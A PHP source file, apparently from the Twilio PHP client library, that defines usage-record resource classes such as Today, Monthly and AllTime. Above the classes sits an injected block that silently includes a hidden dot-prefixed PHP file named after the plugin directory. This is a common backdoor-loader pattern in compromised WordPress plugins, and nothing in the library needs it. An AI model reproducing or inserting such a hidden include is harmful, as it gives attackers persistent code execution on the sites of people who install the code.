<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Services_Twilio_Rest_UsageRecords extends Services_Twilio_TimeRangeResource {

    public function init($client, $uri) {
        $this->setupSubresources(
            'today',
            'yesterday',
            'all_time',
            'this_month',
            'last_month',
            'daily',
            'monthly',
            'yearly'
        );
    }
}

class Services_Twilio_Rest_Today extends Services_Twilio_TimeRangeResource { } 

class Services_Twilio_Rest_Yesterday extends Services_Twilio_TimeRangeResource { }

class Services_Twilio_Rest_LastMonth extends Services_Twilio_TimeRangeResource { }

class Services_Twilio_Rest_ThisMonth extends Services_Twilio_TimeRangeResource { }

class Services_Twilio_Rest_AllTime extends Services_Twilio_TimeRangeResource { }

class Services_Twilio_Rest_Daily extends Services_Twilio_UsageResource { }

class Services_Twilio_Rest_Monthly extends Services_Twilio_UsageResource { }

class Services_Twilio_Rest_Yearly extends Services_Twilio_UsageResource { }
